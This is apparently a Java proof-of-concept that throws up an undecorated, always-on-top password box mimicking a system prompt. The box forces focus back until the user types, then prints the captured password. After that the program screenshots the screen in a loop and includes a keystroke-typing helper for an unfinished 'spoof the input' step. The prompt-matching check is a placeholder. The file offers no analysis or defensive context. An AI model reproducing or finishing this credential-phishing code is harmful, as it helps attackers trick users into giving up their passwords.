package kcap;

import java.awt.AWTException;
import java.awt.BorderLayout;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyEvent;
import java.awt.event.WindowEvent;
import java.awt.event.WindowFocusListener;
import java.awt.image.*;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.concurrent.atomic.AtomicBoolean;
import javax.imageio.ImageIO;
import javax.swing.*;

/**
 *
 * @author scriptjunkie
 */
public class Kcap {

    static Robot r;

    private static void writeString(String s) {
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (Character.isUpperCase(c)) {
                r.keyPress(KeyEvent.VK_SHIFT);
            }
            r.keyPress(Character.toUpperCase(c));
            r.keyRelease(Character.toUpperCase(c));

            if (Character.isUpperCase(c)) {
                r.keyRelease(KeyEvent.VK_SHIFT);
            }
        }
        r.delay(50);
    }

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws AWTException, IOException, InterruptedException {
        r = new Robot();
        Rectangle sr = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        JFrame j = new JFrame();
        j.setUndecorated(true);
        AtomicBoolean entered = new AtomicBoolean(false);
        JPasswordField jpf = new JPasswordField(30);
        jpf.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                System.out.println("Got " + new String(jpf.getPassword()));
                entered.set(true);
                j.setVisible(false);
            }
        });
        j.getContentPane().add(jpf, BorderLayout.CENTER);
        j.pack();
        j.setAlwaysOnTop(true);
        j.setBounds((int) sr.getWidth() / 2 - 100,
                (int) sr.getHeight() / 2 - 50, 200, 100);
        j.setVisible(true);
        //This part makes sure they stay focused on us. Probably not necessary.
        j.addWindowFocusListener(new WindowFocusListener() {
            @Override
            public void windowGainedFocus(WindowEvent e) {
            }

            @Override
            public void windowLostFocus(WindowEvent e) {
                if (!entered.get()) {
                    System.out.println("Focus!");
                    j.setVisible(false);
                    j.setVisible(true);
                    j.toFront();
                    System.out.println(jpf.requestFocus(true));
                }
            }
        });

        while (!entered.get()) {
            Thread.sleep(100);
        }

        //Step 1: wait for the prompt
        BufferedReader bf = new BufferedReader(new InputStreamReader(System.in));
        boolean foundPrompt = false;
        while (!foundPrompt) {
            BufferedImage image = new Robot().createScreenCapture(sr);
            final int[] pixels = ((DataBufferInt) image.getData(new Rectangle((int) sr.getWidth() / 2 - 100,
                    (int) sr.getHeight() / 2 - 50, 200, 100)).getDataBuffer()).getData();
            ImageIO.write(image, "png", new File("screenshot.png"));
            if (Arrays.equals(pixels, new int[]{0, 1, 2, 3})) {
                break;
            }
            if (bf.ready()) {
                break;
            }
            System.out.println("...");
            r.delay(1000);
        }
        //Step 2: spoof the input
    }

}
